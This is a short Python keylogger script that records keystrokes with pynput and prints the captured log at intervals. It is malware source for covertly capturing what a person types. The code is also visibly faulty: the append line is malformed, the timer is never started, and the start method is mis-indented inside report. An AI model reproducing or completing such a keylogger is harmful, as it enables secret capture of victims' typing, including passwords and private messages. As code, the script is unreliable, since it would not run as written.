#!/usr/bin/env python
import pynput.keyboard
import threading


class Keylogger:
    def __init__(self, time_interval):
        self.log = ""
        self.interval = time_interval

    def append_to_log(self, string):
        self.log = + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)

        def start(self):
            keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

            with keyboard_listener:
                self.report()
                keyboard_listener.join()